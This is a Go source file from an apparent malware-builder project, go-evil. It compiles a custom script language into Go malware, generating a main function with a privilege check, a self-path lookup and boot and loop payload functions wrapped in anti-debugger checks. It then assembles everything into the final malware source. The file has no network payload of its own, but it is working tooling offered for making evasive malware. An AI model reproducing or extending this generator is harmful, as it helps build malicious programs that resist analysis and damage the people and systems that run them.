package parsing

import (
	"fmt"
	"regexp"

	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/tools"
)

//
//
// Generates the main function of the malware
//
//
func generate_main_function(s_json string, boot_functions []string, loop_functions []string) string {
	data_object := structure.Receive(s_json)

	// Create the main function here
	main_functions := []string{"func main(){"}

	// Adds all arguments
	main_functions = append(main_functions, "arguments.Argument_add(\"--verbose\", \"-v\", false, \"Show all generated logs during runtime\")", "parsed := arguments.Argument_parse()")
	main_functions = append(main_functions, "if _, ok := parsed[\"-v\"]; ok{", "spine.logging = \"3\"", "}")

	main_functions = append(main_functions, "spine.alpha.alphabet = []string{\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"A\", \"B\", \"C\", \"D\", \"E\", \"F\", \"G\", \"H\", \"I\", \"J\", \"K\", \"L\", \"M\", \"N\", \"O\", \"P\", \"Q\", \"R\", \"S\", \"T\", \"U\", \"V\", \"W\", \"X\", \"Y\", \"Z\", \"!\", \"#\", \"$\", \"€\", \"%\", \"&\", \"\\\"\", \"(\", \")\", \"*\", \"+\", \",\", \"-\", \".\", \"/\", \":\", \";\", \"<\", \"=\", \">\", \"?\", \"@\", \"[\", \"\\\\\", \"]\", \"^\", \"_\", \"`\", \"{\", \"|\", \"}\", \"~\", \" \", \"\\t\", \"\\n\", \"\\r\", \"\\x0b\", \"\\x0c\"}")

	// Adds all the €1€ - €5€ to the final malware
	main_functions = append(main_functions, fmt.Sprintf("spine.variable.roof = %d", data_object.Var_max))
	main_functions = append(main_functions, "spine.variable.pointer = 0")
	main_functions = append(main_functions, "spine.variable.values = make([]string, spine.variable.roof)")

	for i := 0; i < data_object.Var_max; i++ { // Add default value for each entry
		main_functions = append(main_functions, fmt.Sprintf("spine.variable.values[%d] = \"NULL\"", i))
	}

	// Checks if the malware has any priviliges on boot
	main_functions = append(main_functions, "spine.check_privileges()")

	// Figures out the malwares current position
	main_functions = append(main_functions, "spine.path = tools.Grab_executable_path()")

	// Add boot functions
	for _, boot_name := range boot_functions {
		main_functions = append(main_functions, fmt.Sprintf("%s()", boot_name))
	}

	// Decide the header of the for "infinite" loop
	switch data_object.Debugger_behavior {
	case "stop":
		main_functions = append(main_functions, "for !stop_behavior() && !detect_debugger_time() {")
	case "remove":
		main_functions = append(main_functions, "for !remove_behavior() && !detect_debugger_time() {")
	case "none":
		main_functions = append(main_functions, "for {")
	case "loop":
		main_functions = append(main_functions, "for !loop_behavior() && !detect_debugger_time() {")
	}

	// Add loop function
	for _, loop_name := range loop_functions {
		main_functions = append(main_functions, (fmt.Sprintf("%s()", loop_name)))
	}

	// Add the footer
	main_functions = append(main_functions, "}}")

	data_object.Add_go_function(main_functions)

	data_object.Add_go_import("github.com/s9rA16Bf4/ArgumentParser/go/arguments")

	return structure.Send(data_object)

}

//
//
// This functions binds everything togheter and will generate a complete go code in the structure
//
//
func construct_final_malware(s_json string) string {
	data_object := structure.Receive(s_json)

	// Add all imports
	data_object.Add_malware_line("import (")
	for _, new_import := range data_object.GO_imports {
		data_object.Add_malware_line(new_import)
	}
	data_object.Add_malware_line(")")

	// Add all structs
	if len(data_object.GO_struct) > 0 {
		for _, new_struct := range data_object.GO_struct {
			data_object.Add_malware_line(new_struct)
		}
	}

	// Add all const
	if len(data_object.GO_const) > 0 {
		data_object.Add_malware_line("const (")
		for _, new_const := range data_object.GO_const {
			data_object.Add_malware_line(new_const)
		}
		data_object.Add_malware_line(")")
	}

	// Add all globals
	if len(data_object.GO_global) > 0 {
		for _, new_global := range data_object.GO_global {
			data_object.Add_malware_line(new_global)
		}
	}

	// And finally add all our functions
	for _, new_func := range data_object.GO_functions {
		data_object.Add_malware_line(new_func)
	}

	return structure.Send(data_object)
}

//
//
// Filters each definied function into the two categories, boot and loop (call functions aren't handled here)
//
//
func filter_function_types(d_funcs []structure.Func_t) ([]string, []string) {
	boot_functions := []string{}
	loop_functions := []string{}

	for _, d_func := range d_funcs {

		// Identify the function type
		if d_func.Func_type == "b" {
			boot_functions = append(boot_functions, d_func.Name)

		} else if d_func.Func_type == "l" {
			loop_functions = append(loop_functions, d_func.Name)

		}
	}

	return boot_functions, loop_functions
}

//
//
// Converts each sub function into a corresponding set of golang code
//
//
func generate_go_functions(s_json string) (string, []string, []string) {
	data_object := structure.Receive(s_json)

	boot_func, loop_func := filter_function_types(data_object.Functions)

	// For each of our functions
	for _, d_func := range data_object.Functions {

		data := []string{fmt.Sprintf("func %s(){", d_func.Name)} // Define the header

		converted_code, s_json := generate_body_code(d_func.Gut, structure.Send(data_object)) // Generate the body code

		data = append(data, converted_code...)

		data = append(data, "}") // And add the footer

		data_object = structure.Receive(s_json)
		data_object.Add_go_function(data)
	}

	return structure.Send(data_object), boot_func, loop_func
}

//
//
// Converts evil code to golang code and returns it
//
//
func generate_body_code(gut []string, s_json string) ([]string, string) {
	calls := []string{}

	for i := 0; i < len(gut); i++ {
		line := gut[i]
		call_functions := []string{}

		// Identify which domain to call on
		regex := regexp.MustCompile(DOMAIN_FUNC_VALUE)
		data := regex.FindAllStringSubmatch(line, -1)

		if len(data) > 0 {
			// This makes it easier to figure out what is what
			domain := data[0][1]
			function := data[0][2]
			value := data[0][3]

			call_functions, s_json = construct_domain_code(domain, function, value, s_json)

		} else {
			regex = regexp.MustCompile(GET_FOREACH_HEADER)
			data = regex.FindAllStringSubmatch(line, -1)

			if len(data) > 0 {
				body := []string{}
				i++ // Skips the header

				for ; i < len(gut); i++ { // Grabs all data between the header and footer, but also fast forwards the index
					result := tools.Contains(gut[i], []string{GET_FOREACH_FOOTER})
					status := result[GET_FOREACH_FOOTER]

					if !status {
						body = append(body, gut[i])

					} else { // Footer reached
						break
					}
				}
				call_functions, s_json = construct_foreach_loop(data[0][1], body, s_json)

			}
		}

		if len(call_functions) > 0 { // Don't want any empty lines
			calls = append(calls, call_functions...)
		}
	}

	return calls, s_json
}
